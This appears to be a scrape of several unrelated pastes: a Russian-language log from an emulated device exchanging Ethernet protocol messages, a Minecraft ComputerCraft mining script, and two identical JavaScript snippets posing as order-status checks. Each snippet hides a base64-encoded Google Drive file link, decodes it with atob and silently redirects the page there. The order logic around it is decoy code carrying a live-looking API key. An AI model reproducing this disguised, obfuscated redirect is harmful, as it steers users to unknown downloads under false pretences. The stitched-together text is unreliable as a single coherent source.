SVM (LAK 0x08) accepted connection from 192.168.189.128:39514 (client handle: 4)
Ethernet: Closing handle 3
SVM (LAK 0x08): Starting worker threads...
SVM Timer thread started.
SVM Processor thread started.
SVM Receiver thread started (handle: 4).
Получено сообщение через Ethernet: Тип=128, Номер=0, Длина тела=2, Handle=4
SVM (LAK 0x08): All threads started. Running...
SVM Sender thread started.
Processor: Обработка 'Инициализация канала'
  SVM LAK set to 0x08 from request.
  SVM: Эмуляция выключения лазера...
  Ответ 'Подтверждение инициализации' сформирован (LAK=0x08).
Отправка сообщения через Ethernet: Тип=129, Номер=0, Длина тела=12, Общий размер=18, Handle=4
Получено сообщение через Ethernet: Тип=1, Номер=1, Длина тела=1, Handle=4
Processor: Обработка 'Провести контроль'
  SVM: Эмуляция самопроверки...
  Ответ 'Подтверждение контроля' сформирован.
Отправка сообщения через Ethernet: Тип=3, Номер=1, Длина тела=8, Общий размер=14, Handle=4
Получено сообщение через Ethernet: Тип=2, Номер=2, Длина тела=1, Handle=4
Processor: Обработка 'Выдать результаты контроля'
  Ответ 'Результаты контроля' сформирован.
Отправка сообщения через Ethernet: Тип=4, Номер=2, Длина тела=8, Общий размер=14, Handle=4
Получено сообщение через Ethernet: Тип=6, Номер=3, Длина тела=0, Handle=4
Processor: Обработка 'Выдать состояние линии'

--- SVM Counters ---
BCB Counter: 0x00000050 (80)
LinkUp Changes (KLA): 0
LinkUp Low Time (SLA): 0 (x 1/100 us)
SignDet Changes (KSA): 0
--- End Counters ---
  Ответ 'Состояние линии' сформирован.
Отправка сообщения через Ethernet: Тип=7, Номер=3, Длина тела=16, Общий размер=22, Handle=4
Получено сообщение через Ethernet: Тип=170, Номер=4, Длина тела=46, Handle=4
Processor: Обработка 'Принять параметры СДР' (нет ответа).
Получено сообщение через Ethernet: Тип=210, Номер=5, Длина тела=10, Handle=4
Processor: Обработка 'Принять параметры ЦДР' (нет ответа).
Получено сообщение через Ethernet: Тип=255, Номер=6, Длина тела=256, Handle=4
Processor: Обработка 'Навигационные данные' (нет ответа).
receive_protocol_message: Соединение закрыто при чтении заголовка.
Receiver Thread: Connection closed by UVM. Initiating shutdown.
Thread-safe Message queue shutdown initiated.
Processor Thread: Incoming queue empty and shutdown. Exiting.
SVM Processor thread finished.
Processor Thread: Shutting down outgoing queue...
Thread-safe Message queue shutdown initiated.
Sender Thread: Outgoing queue empty and shutdown. Exiting.
SVM Sender thread finished.
Timer thread stop signaled.
SVM Receiver thread finished.
SVM Timer thread stopped.
SVM Main: Receiver thread joined.
SVM Main: Joining remaining threads...
SVM Main: Processor thread joined.
SVM Main: Sender thread joined.
SVM Main: Timer thread joined.
Ethernet: Closing handle 4
SVM: Client handle closed.
Thread-safe Message queue destroyed
Thread-safe Message queue destroyed
Ethernet Interface destroyed.
SVM (ID 0) finished.

"
tLMvF2Jj,nether_miner,DabDaddy6223,Lua,Sunday 20th of April 2025 01:15:06 PM CDT,"ACCEPTABLE_FUEL = {""minecraft:coal""}
FUEL_COUNT = -1
FUEL_INDEX = -1

-- Utilities
function arrHasValue(arr, val)
    for index, value in ipairs(arr) do
        if value == val then
            return true
        end
    end

    return false
end

-- Fuel
function hasFuel()
    return FUEL_COUNT > 0
end

function shouldRefuel()
    return turtle.getFuelLevel() <= 0
end

function refuel()
    if shouldRefuel() == true then
        if hasFuel() ~= true then
            return false
        end

        turtle.select(1)
        turtle.refuel(1)
        FUEL_COUNT = FUEL_COUNT - 1
    end

    return true
end

-- Inventory
function getSlotData(index)
    turtle.select(index)
    local slotData = turtle.getItemDetail()
    return slotData
end



function main()
    -- Setup
    for i=1, 16 do
        local curr_slot_data = getSlotData(i)
        if curr_slot_data ~= nil then
            if FUEL_INDEX == -1 then
                if arrHasValue(ACCEPTABLE_FUEL, curr_slot_data[""name""]) then
                    FUEL_INDEX = i
                    FUEL_COUNT = curr_slot_data[""count""]
                    break
                end
            end
        end
    end

    if FUEL_INDEX == -1 then
        print(""No fuel!"")
        return
    end

    print(""Fuel Index: "" .. FUEL_INDEX)

    while true do
        if refuel() == false then
            print(""Ran out of fuel!"")
            return
        end

        local has_block, data = turtle.inspect()
        if has_block then
            if data[""name""] == ""minecraft:cobblestone"" then
                break
            end
        end

        turtle.dig()
        turtle.forward()
        turtle.digUp()
        turtle.digDown()
    end
end

main()"
wNWK3Tcp,Untitled,jm33,JavaScript,Sunday 20th of April 2025 01:08:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12354/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
71vtfBkT,Products.js,jm33,JavaScript,Sunday 20th of April 2025 12:53:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64674/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
